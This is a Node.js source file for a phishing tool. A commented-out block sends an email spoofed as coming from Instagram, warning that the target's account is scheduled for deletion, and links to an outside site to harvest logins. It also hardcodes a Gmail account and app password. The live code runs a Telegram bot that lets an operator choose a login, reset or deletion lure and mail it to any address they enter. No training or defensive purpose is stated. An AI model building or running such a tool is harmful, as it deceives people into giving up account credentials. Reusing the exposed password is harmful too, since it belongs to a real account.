// const nodemailer = require("nodemailer");

// const toEmail = "kdg01@ganpatuniversity.ac.in";
// // const toEmail = "1echguruji@gmail.com";
// const username = "Krunal";

// // transporter
// const transporter = nodemailer.createTransport({
//   service: "gmail",
//   auth: {
//     user: "rahulprajapati23@gnu.ac.in",
//     pass: "duop lqpk fgeh pmso"
//   }
// });

// // mail
// const mailOptions = {
//   from: '	"Instagram" <noreply@mail.instagram.com>',
//   to: toEmail,
//   subject: "Your Instagram account is scheduled for deletion",
//   html: `
//   <!DOCTYPE html>
//   <html>
//   <body style="margin:0; padding:0; background:#ffffff; font-family:Arial, sans-serif;">

//   <table width="100%" style="max-width:600px; margin:auto;">
//       <tr>
//       <td align="center" style="padding:20px;">
//         <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg"
//              width="120" style="display:block;">
//       </td>
//     </tr>
//     <tr>
//       <td style="padding:20px 0;">
//         <h2>Your Instagram account is scheduled for deletion</h2>
//       </td>
//     </tr>

//     <tr>
//       <td style="font-size:14px;">
//         <p>Hi <strong>${username}</strong>,</p>

//         <p>
//           We're sorry to see you requested to delete your account.
//           If you change your mind, you have until <strong>May 30, 2026</strong> to let us know.
//           Otherwise, all your posts and information will be deleted.
//         </p>

//         <p> If this was a mistake, or you want to keep your account after all, please let us know.</p>
//       </td>
//     </tr>

//     <tr>
//   <td align="center" style="padding:20px;">
//     <table role="presentation" cellspacing="0" cellpadding="0" border="0">
//       <tr>
//         <td align="center" bgcolor="#2e43e0" style="border-radius:6px;">
//           <a href="https://seclog-jet.vercel.app/"
//              target="_blank"
//              style="font-size:14px; font-family:Arial, sans-serif; color:#ffffff; 
//              text-decoration:none; padding:12px 24px; display:inline-block; font-weight:bold;">
//              Keep Account
//           </a>
//         </td>
//       </tr>
//     </table>
//   </td>
// </tr>

//  <tr>
//       <td style="font-size:12px; color:#666; padding-top:20px; line-height:18px;">
//         <p>This message was sent to ${toEmail}.</p>

//         <p>
//           Not your account?
//           <a href="https://seclog-jet.vercel.app/" style="color:#4A5DF9; text-decoration:none;">
//           Remove your email from this account.
//           </a>
//         </p>

//         <p>
//           Meta Platforms, Inc.,<br>
//           Attention: Community Support,<br>
//         1 Meta Way, Menlo Park, CA 94025
//         </p>
//       </td>
//     </tr>

//   </table>

//   </body>
//   </html>
//   `
// };

// // send
// transporter.sendMail(mailOptions, (error, info) => {
//   if (error) {
//     console.log("Error:", error);
//   } else {
//     console.log("Email Sent:", info.response);
//   }
// });
require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");
const nodemailer = require("nodemailer");
const express = require("express");

const token = process.env.BOT_TOKEN;

// 🔥 BOT (WEBHOOK MODE)
const bot = new TelegramBot(token);

// templates
const loginTemplate = require("./templates/login");
const resetTemplate = require("./templates/reset");
const deleteTemplate = require("./templates/delete");

// debug
console.log("BOT:", process.env.BOT_TOKEN);
console.log("EMAIL:", process.env.EMAIL_USER);

// 🔥 TRANSPORTER (GMAIL)
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

// 🔍 SMTP CHECK
transporter.verify((err, success) => {
  if (err) {
    console.log("SMTP ERROR:", err);
  } else {
    console.log("SMTP READY");
  }
});

// 🎯 TEMPLATE SELECTOR
function getTemplate(type, data) {
  if (type === "login") return loginTemplate(data);
  if (type === "reset") return resetTemplate(data);
  if (type === "delete") return deleteTemplate(data);
  throw new Error("Invalid template");
}

// 🧠 USER STATE
let userState = {};

// 🚀 START
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "Select mail type:", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Login Attempt", callback_data: "login" }],
        [{ text: "Password Reset", callback_data: "reset" }],
        [{ text: "Account Deletion", callback_data: "delete" }]
      ]
    }
  });
});

// 🎯 BUTTON CLICK
bot.on("callback_query", (query) => {
  const chatId = query.message.chat.id;
  const type = query.data;

  userState[chatId] = { step: "username", type };

  bot.sendMessage(chatId, "Enter username:");
});

// 🧠 INPUT FLOW
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;

  if (!msg.text || msg.text.startsWith("/")) return;
  if (!userState[chatId]) return;

  const state = userState[chatId];

  // STEP 1 → username
  if (state.step === "username") {
    state.username = msg.text;
    state.step = "email";
    return bot.sendMessage(chatId, "Enter email:");
  }

  // STEP 2 → email
  if (state.step === "email") {
    state.email = msg.text;

    // 🔍 basic validation
    if (!state.email.includes("@")) {
      return bot.sendMessage(chatId, "❌ Invalid email");
    }

    try {
      const template = getTemplate(state.type, {
        username: state.username,
        email: state.email
      });

      const mailOptions = {
        from: `"Security Team" <${process.env.EMAIL_USER}>`,
        to: state.email,
        subject: template.subject,
        html: template.html
      };

      const info = await transporter.sendMail(mailOptions);
      console.log("MAIL SUCCESS:", info.response);

      bot.sendMessage(chatId, "✅ Mail Sent Successfully");

    } catch (err) {
      console.log("MAIL ERROR:", err);
      bot.sendMessage(chatId, "❌ Error sending mail");
    }

    delete userState[chatId];
  }
});

// 🌐 EXPRESS SERVER
const app = express();

app.use(express.json());

// 🔥 WEBHOOK ROUTE
app.post(`/bot${token}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// TEST ROUTE
app.get("/", (req, res) => {
  res.send("Bot is running 🚀");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running on port", PORT));